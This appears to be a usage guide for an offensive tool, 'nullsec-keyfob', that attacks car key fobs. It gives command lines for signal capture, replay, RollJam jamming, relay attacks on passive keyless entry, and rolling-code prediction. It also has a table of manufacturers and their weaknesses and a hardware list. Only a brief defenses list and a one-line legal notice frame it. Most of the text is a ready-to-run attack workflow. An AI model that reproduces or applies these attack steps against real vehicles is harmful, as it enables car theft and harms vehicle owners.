# NullSec Key Fob Attack Guide

## Signal Capture

### Rolling Code Capture
```bash
# Capture key fob signal
nullsec-keyfob --capture --freq 315e6 -o capture.iq

# 433 MHz European fobs
nullsec-keyfob --capture --freq 433.92e6 -o capture.iq

# Analyze captured signal
nullsec-keyfob --analyze --input capture.iq
```

### Protocol Detection
```bash
# Auto-detect modulation and encoding
nullsec-keyfob --detect --input capture.iq

# Supported protocols: ASK, OOK, FSK, Manchester, PWM
```

## Attack Techniques

### Replay Attack (Fixed Code)
```bash
# Replay captured signal
nullsec-keyfob --replay --input capture.iq --freq 315e6

# Older vehicles without rolling codes only
```

### RollJam Attack
```bash
# Jam and capture (requires 2 SDRs)
nullsec-keyfob --rolljam --capture-freq 315e6 --jam-freq 315.01e6

# Replay captured code later
nullsec-keyfob --replay --input rolljam_capture.iq
```

### Relay Attack (PKES)
```bash
# Passive Keyless Entry relay
# Requires 2 devices: one near car, one near key

# Near key device
nullsec-keyfob --relay --mode key --peer 10.0.0.2

# Near car device
nullsec-keyfob --relay --mode car --peer 10.0.0.1

# Real-time LF/UHF relay
```

### Rolling Code Prediction
```bash
# For vulnerable implementations (KeeLoq, etc.)
nullsec-keyfob --predict --captures codes.txt --manufacturer honda

# Requires multiple captured codes
```

## Supported Manufacturers

| Manufacturer | Protocol | Frequency | Vulnerable |
|--------------|----------|-----------|------------|
| Ford | KeeLoq | 315 MHz | Partial |
| GM | KeeLoq | 315 MHz | Partial |
| Toyota | DST80 | 312 MHz | Key clone |
| Honda | Rolling | 315 MHz | Relay |
| VW/Audi | Megamos | 433 MHz | Partial |
| BMW | CAS/FEM | 433 MHz | Relay |

## Hardware

### SDR Devices
- HackRF One (TX/RX)
- RTL-SDR (RX only)
- Yard Stick One (sub-GHz)
- Flipper Zero

### Relay Hardware
- Proxmark3 (LF relay)
- Custom LF amplifier
- ESP32 with CC1101

## Defenses
- Faraday pouch for keys
- Motion-sensitive key fobs
- UWB-based PKES (newer vehicles)
- PIN-to-drive features

## Legal Notice
For authorized security research on owned vehicles only.
